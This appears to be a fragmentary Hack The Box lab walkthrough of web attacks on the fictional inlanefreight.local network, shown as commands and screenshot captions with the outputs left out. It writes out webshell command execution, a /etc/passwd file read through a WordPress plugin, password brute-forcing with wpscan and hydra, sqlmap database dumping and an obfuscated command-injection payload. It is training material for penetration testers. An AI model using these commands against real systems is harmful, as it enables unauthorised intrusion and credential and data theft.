...
```shell-session
0xmid00@htb[/htb]$ cat ilfreight_subdomains
...
```shell-session
0xmid00@htb[/htb]$ eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness
...
![Web page showing JobEntry portal with 'Find The Perfect Job That You Deserved' banner, search options for jobs and talents, and login page for vpn.inlanefreight.local.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/ilfreight_eyewitness.png)
...
![Web page titled 'Test' with a search bar and message 'Welcome to Test'. No front page content created. Includes a link to the User Guide. Powered by Drupal.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/drupal.png)
...
```shell-session
0xmid00@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep Drupal
...
```shell-session
0xmid00@htb[/htb]$ gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
...
![HTTP request to dev.inlanefreight.local using TRACK method, with response showing X-Custom-IP-Authorization: 127.0.0.1. HTML response includes a form for file upload.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/track_method_auth.png)
...
![Web page titled 'Pixel Shop' with a colorful camera logo, options for Crop, Filters, and Advance Filters, and buttons to Browse and Submit.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/pixel_shop.png)
...
```shell-session
0xmid00@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id
...
```shell-session
0xmid00@htb[/htb]$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=hostname%20-I
...
```shell-session
0xmid00@htb[/htb]$ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
...
```shell-session
0xmid00@htb[/htb]$ curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
...
```shell-session
0xmid00@htb[/htb]$ wpscan -e u -t 500 --url http://ir.inlanefreight.local
...
Let's try to brute-force one of the account passwords using [this](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-100.txt) wordlist from the `SecLists` GitHub repo. Using `WPScan` again, we get a hit for the `ilfreightwp` account.

Web Enumeration & Exploitation

```shell-session
0xmid00@htb[/htb]$ wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
...
```shell-session
0xmid00@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql 
...
```shell-session
0xmid00@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql --dbs
...
```shell-session
0xmid00@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql -D status --tables
...
```shell-session
0xmid00@htb[/htb]$ sudo php -S 0.0.0.0:9200
...
![Web page for support.inlanefreight.local with a Cookie Editor open, showing a session cookie with value fcfaf93ab169bc943b92109f0a845d99.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/edit_cookie.png)
...
![Document viewer displaying a list of system users and paths, including root, daemon, and various service accounts, with details like shell paths and user IDs.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/ssrf_file_read.png)
...
![GitLab projects page showing 'shopdev2.inlanefreight.local' and 'Monitoring' projects under 'Explore projects' tab, with options to filter by name and updated date.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/gitlab_explore.png)
...
![HTTP request to shopdev2.inlanefreight.local with POST method to /checkout.php, including XML payload. Response shows server user list from /etc/passwd.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/xxe_passwd.png)
...
```shell-session
0xmid00@htb[/htb]$ hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
...
![Terminal displaying a list of commands: ls, cat, whoami, date, help, clear, reboot, cd, mv, rm, rmdir, touch, connection_test.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/monitoring.png)
...
![Terminal showing files: todo.txt, note.txt, contact.txt. Contents of todo.txt: tasks to remove staging files and configure authentication. Contents of note.txt: reminder to configure authentication service and test applications in development mode. Contents of contact.txt: admin@inlanefreight.local.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/monitoring_files.png)
...
```shell-session
0xmid00@htb[/htb]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"
...
```shell-session
0xmid00@htb[/htb]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"
...
![HTTP GET request to monitoring.inlanefreight.local with command injection attempt using socat. Response shows successful ping to 127.0.0.1 with /usr/bin/socat output.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/163/socat_check.png)
